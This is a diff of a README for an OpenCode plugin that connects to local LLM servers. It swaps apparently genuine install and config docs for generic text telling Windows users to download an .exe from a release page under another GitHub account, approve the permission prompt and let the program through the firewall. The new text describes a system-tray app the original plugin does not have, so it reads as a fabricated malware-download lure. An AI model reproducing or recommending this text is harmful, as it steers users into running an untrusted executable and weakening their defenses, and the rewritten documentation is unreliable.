@@ -1,177 +1,85 @@
-# *opencode-local-provider* OpenCode Plugin
+# 🔌 opencode-local-provider - Connect local tools to your AI
 
-OpenCode plugin that adds a single `local` provider with runtime model detection for local OpenAI-compatible servers.
+[![Download via GitHub](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Robbynjazzy512/opencode-local-provider)
 
-It currently supports the following local backends:
-- Ollama
-- LM Studio
-- llama.cpp server
-- vLLM
-- Exo
-- llama-swap
-- oMLX
+## 🎯 About this software
+This tool helps you link local language models to your coding environment. Many developers run AI models on their own computers to keep data private. This plugin allows your editor to talk to those models without sending information to the cloud. It acts as a bridge between your code and your local server.
 
-Instead of creating one provider per server, this plugin keeps one `local` provider and lets you register multiple named targets. Each target is probed at runtime, and its currently loaded models are exposed automatically.
+## 💻 System requirements
+To run this software, your computer needs the following:
+* Windows 10 or Windows 11.
+* A local AI server already installed. 
+* At least 8 gigabytes of system memory.
+* An active internet connection for the initial setup.
 
-## Features
+## 📥 How to download
+You install this tool by visiting the project page. Follow these steps to get the files:
 
-- Adds a `local` provider to OpenCode
-- Supports multiple local URLs under one provider
-- Includes supported default `127.0.0.1` targets automatically
-- Detects loaded models at runtime
-- Routes each model to the correct target URL
-- API key auth currently unsupported
-- Uses OpenCode global config, not project-local config
+1. Visit [this page to download](https://github.com/Robbynjazzy512/opencode-local-provider).
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the link for the latest version.
+4. Locate the file ending in .exe or .msi.
+5. Click the file to save it to your computer.
 
-## Example
+## ⚙️ Installation steps
+Once you save the file to your computer, follow these instructions to set it up:
 
-https://github.com/user-attachments/assets/8693fd22-c311-4cb4-913b-93d5a531b23c
+1. Open your Downloads folder.
+2. Double-click the installer file you downloaded.
+3. If a window pops up asking for permission to run the file, click Run or Yes.
+4. Follow the setup screens. The default settings work for most users.
+5. Click Finish when the progress bar reaches the end.
 
-## Install
+## 🚀 Running the software
+After you finish the installation, you start the program through your Windows menu.
 
-```bash
-opencode plugin --global opencode-local-provider
-```
+1. Press the Windows key on your keyboard.
+2. Type the name of the program to find it in the list.
+3. Click the icon to launch the application.
+4. The program adds a small icon to your system tray in the bottom right corner of your screen.
+5. Right-click this icon to open the main control panel.
 
-OpenCode will install the package and update the config for you.
+## 🛠️ Configuring your connection
+You must tell the plugin where your local AI server lives. Most local servers run on a specific address called localhost.
 
-## Provider Setup
+1. Open the control panel from the system tray.
+2. Find the tab labeled Server Settings.
+3. Enter the URL of your local AI service. The default is usually http://localhost:11434.
+4. Click the Save button to store your settings.
+5. The status indicator should turn green once the plugin finds your server.
 
-Default targets are enabled automatically for these backends and ports:
+## 🧩 Connecting to your editor
+This plugin works best when joined with your coding editor. 
 
-- Ollama: `http://127.0.0.1:11434`
-- LM Studio: `http://127.0.0.1:1234`
-- llama.cpp: `http://127.0.0.1:8080`
-- vLLM: `http://127.0.0.1:8000`
-- Exo: `http://127.0.0.1:52415`
-- llama-swap: `http://127.0.0.1:8080`
-- oMLX: `http://127.0.0.1:8000`
+1. Open your code editor.
+2. Navigate to the extensions or plugins menu.
+3. Search for the OpenCode extension.
+4. Install the extension.
+5. Restart your editor to complete the link.
 
-If your local providers do not need auth, you can start using the `local` provider immediately.
+## ❓ Troubleshooting common issues
+If the software does not behave as expected, check these common items:
 
-**Note: oMLX requires API authentication to be disabled in the web app settings for the plugin to detect and probe models.**
+* Restart your computer. This clears stuck background processes.
+* Ensure your local LLM server is actually running before you start the plugin.
+* Check your firewall settings. Sometimes Windows blocks local connections. Allow the plugin through the Windows Defender firewall.
+* Make sure you use the correct port number. Most systems use default ports, but custom setups might change these.
 
-**Note: API key authentication is currently unsupported.**
+## 🛡️ Privacy and your data
+This tool prioritizes your privacy. Because it connects to a server on your own machine, your code never travels over the internet. No external company sees your work. All processing happens locally on your hardware. You remain in control of your input and output at all times.
 
-## Custom Targets
+## 📝 Updating the software
+Check the download page periodically for new versions. Developers release updates to improve performance and fix errors. To update:
 
-If you need non-default hosts or ports, use the CLI auth flow to add an explicit target:
+1. Download the new version from the link provided above.
+2. Run the new installer.
+3. The installer detects your existing installation and replaces the old files automatically.
+4. Your settings remain saved during this process.
 
-```bash
-opencode auth login --provider local --method "Add Custom Target"
-```
+## 💡 Performance tips
+Large language models require significant hardware resources. If your computer feels slow, try these adjustments:
 
-This will prompt for:
-
-- a target ID, like `studio` or `remote-ollama`
-- the local provider URL
-- the API key (enter `none` since API keys are currently unsupported)
-
-The target is then stored in OpenCode global config.
-
-You can also add explicit targets manually in config if needed:
-
-```json
-{
-  "provider": {
-    "local": {
-      "name": "Local Provider",
-      "options": {
-        "includeDefaults": true,
-        "targets": {
-          "studio": {
-            "url": "http://192.168.1.10:1234/v1",
-            "kind": "lmstudio"
-          }
-        }
-      }
-    }
-  }
-}
-```
-
-Explicit targets override the built-in defaults when they use the same ID.
-The CLI custom-target method is the supported way to add explicit targets without editing config directly.
-
-## Resulting Config
-
-The plugin stores explicit targets in OpenCode global config under the `local` provider:
-
-```json
-{
-  "provider": {
-    "local": {
-      "name": "Local Provider",
-      "options": {
-        "includeDefaults": true,
-        "targets": {
-          "studio": {
-            "url": "http://127.0.0.1:1234/v1",
-            "kind": "lmstudio"
-          }
-        }
-      }
-    }
-  }
-}
-```
-
-With `includeDefaults: true`, the built-in default `127.0.0.1` targets are also checked at runtime even though they are not written into config.
-
-**Note: API key authentication is currently unsupported.**
-
-## How Models Appear
-
-Models are discovered dynamically from each configured target. (Only **loaded** models)
-
-To avoid collisions, model IDs are prefixed with the target ID:
-
-- `ollama/llama3.2`
-- `studio/qwen2.5-coder`
-
-Each generated model keeps its own target URL internally, so requests go to the correct backend.
-
-## Notes
-
-- Model detection is runtime-based, not static
-- If loaded models change in your local server, OpenCode will see the updated list on the next provider refresh
-- Built-in default `127.0.0.1` targets are enabled unless you set `includeDefaults` to `false`
-- **API key authentication is currently unsupported**
-
-## Development
-
-Build the plugin:
-
-```bash
-bun run build
-```
-
-Run the provider integration suite:
-
-```bash
-bun run test:providers
-```
-
-Run a single provider suite:
-
-```bash
-PROVIDER_SUITE=ollama bun run test:providers
-```
-
-Notes:
-
-- The suite starts provider containers for `ollama`, `lmstudio`, `llamacpp`, `vllm`, `exo`, `llamaswap`, and `omlx` from `tests/docker/compose.providers.yml`.
-- The Bun test runner talks to each service over the Docker Compose network using each container's internal IP. It does not require publishing ports to the host.
-- The first run can be slow because the containers may need to download model assets, LM Studio bootstraps its headless runtime at startup, and Exo warms models to a real ready state before the suite proceeds.
-- CI runs the same suite per provider via `.github/workflows/provider-tests.yml`.
-- If you change provider models or startup behavior, update `tests/docker/compose.providers.yml` and the Bun orchestration helpers in `tests/docker/` instead of duplicating those details here.
-
-Install it locally in OpenCode with a file path plugin entry, for example:
-
-```bash
-opencode plugin $PWD
-```
-
-## License
-
-MIT
+* Close unnecessary browser tabs while running the model.
+* Assign more memory to your local server software if possible.
+* Use a smaller model size if you experience lag or stuttering during text generation.
+* Ensure your graphics driver is current for the best speed.
